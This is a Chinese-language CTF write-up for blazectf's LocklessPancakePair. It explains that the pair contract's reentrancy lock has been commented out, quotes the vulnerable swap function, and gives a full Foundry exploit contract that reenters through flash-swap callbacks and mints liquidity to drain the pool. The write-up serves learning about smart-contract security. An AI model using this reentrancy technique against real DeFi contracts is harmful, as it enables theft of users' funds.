### LocklessPancakePair
老实了，接连两道题难度攀升，决定跳过一下

blazectf LocklessPancakePair 这个题又两个合约，第一个合约里两个代币各有1个，第二个合约各有99个，如合约名所说Lockless，这个lock修饰器reqeuire条件不应该被注释，应该放在_下。
```solidity
modifier lock() {
        // require(unlocked == 1, 'Pancake: LOCKED');
        unlocked = 0;
        _;
        unlocked = 1;
    }
```

这个swap函数也挺抽象的，因为他不单单是swap，它支持闪电互换，你swap的两个值可以随便传，它发给你钱，只要你在一笔交易里完成，最后k不变就行

```solidity
function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external lock {
        require(amount0Out > 0 || amount1Out > 0, "Pancake: INSUFFICIENT_OUTPUT_AMOUNT");
        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings
        require(amount0Out < _reserve0 && amount1Out < _reserve1, "Pancake: INSUFFICIENT_LIQUIDITY");

        uint256 balance0;
        uint256 balance1;
        {
            // scope for _token{0,1}, avoids stack too deep errors
            address _token0 = token0;
            address _token1 = token1;
            require(to != _token0 && to != _token1, "Pancake: INVALID_TO");
            if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens
            if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens

            if (data.length > 0) {
                this.sync(); // @shou: no more lock protection, needs to prevent attacker sync during swap
                IPancakeCallee(to).pancakeCall(msg.sender, amount0Out, amount1Out, data);
                this.sync(); // @shou: no more lock protection, needs to prevent attacker sync during swap
            }

            balance0 = IERC20(_token0).balanceOf(address(this));
            balance1 = IERC20(_token1).balanceOf(address(this));
        }
        uint256 amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;
        uint256 amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;
        require(amount0In > 0 || amount1In > 0, "Pancake: INSUFFICIENT_INPUT_AMOUNT");
        {
            // scope for reserve{0,1}Adjusted, avoids stack too deep errors
            uint256 balance0Adjusted = (balance0.mul(10000).sub(amount0In.mul(25)));
            uint256 balance1Adjusted = (balance1.mul(10000).sub(amount1In.mul(25)));
            require(
                balance0Adjusted.mul(balance1Adjusted) >= uint256(_reserve0).mul(_reserve1).mul(10000 ** 2),
                "Pancake: K"
            );
        }

        _update(balance0, balance1, _reserve0, _reserve1);
        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);
    }
```
这个swap同时支持闪电互换，你取两个代币的话只需要归还就行了，他只检查转账的地址to不是两种代币地址，然后转账要求的值，如果data有数据的话会调用to的一个函数，最后检查key，这个题的主要逻辑就是每次swap之后还回去mint一下，重复就能取出我们mint的钱。我们看具体代码

### 解题
``` solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.21;

import {Test} from "forge-std/Test.sol";
import {Challenge, PancakePair} from "../src/Challenge.sol";
import "forge-std/console.sol";

contract LocklessSwapTest is Test {
    Challenge public chal;

    function setUp() public {
        chal = new Challenge();
    }

    function test_lockless() public {
        // conduct flashswap
        // console.log("start pair balance", chal.token1().balanceOf(address(chal.pair()))/ 1e18);
        chal.pair().swap(7 * 1e18, 7 * 1e18, address(this), "1");//初始先闪电互换七个
        chal.pair().transfer(address(chal.pair()), chal.pair().balanceOf(address(this)));
        chal.pair().burn(address(this));
        console.log("end balance 1", chal.token1().balanceOf(address(this)) / 1e18);
        console.log("end balance 0", chal.token0().balanceOf(address(this)) / 1e18);

        chal.token0().transfer(address(chal.randomFolks()), 99 * 1e18);
        chal.token1().transfer(address(chal.randomFolks()), 99 * 1e18);
        require(chal.isSolved(), "chal is not solved");
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        //第一次闪电互换来这
        if (amount0 == 7 * 1e18) {
            chal.pair().sync();

            for (uint256 i = 0; i < 7; i++) {
                chal.pair().swap(90 * 1e18, 90 * 1e18, address(this), "1");
            //进入七次闪电互换，都进入else分支
            }
            chal.faucet();
            chal.token0().transfer(address(chal.pair()), 1 * 1e18);
            chal.token1().transfer(address(chal.pair()), 1 * 1e18);
            console.log("done attack");
        } else {
            chal.pair().sync();

            chal.token0().transfer(address(chal.pair()), 90 * 1e18);
            chal.token1().transfer(address(chal.pair()), 90 * 1e18);
            //还每次借的，为了mint

            chal.pair().mint(address(this));
            //这里我是不解的，虽然最后换完了贷款，我们mint了98个代币，加上另一个合约的1个刚好99个
            //但是为什么不能直接贷款99个，然后还款99个并mint，最后全取出？我是不理解的
            chal.token0().transfer(address(chal.pair()), 1 * 1e18);
            chal.token1().transfer(address(chal.pair()), 1 * 1e18);

            console.log("lp balance", chal.pair().balanceOf(address(this)) / 1e18);
        }
    }
}
```
